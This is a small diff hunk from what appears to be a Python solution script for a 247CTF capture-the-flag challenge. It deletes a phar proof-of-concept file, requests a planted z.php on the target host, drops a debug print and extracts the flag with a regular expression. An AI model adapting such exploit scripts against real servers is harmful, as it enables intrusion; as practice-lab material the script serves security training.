@@ -49,6 +49,5 @@ print("[*] Removing phar/image...")
 subprocess.Popen(["rm","poc.phar"])
 
 r = requests.get("https://%s/z.php" % RHOST)
-print(r.text)
 print("[*] Retrieving flag...")
 print("    -- "+re.search(r"247CTF\{[0-9a-f]{32}\}",r.text)[0])
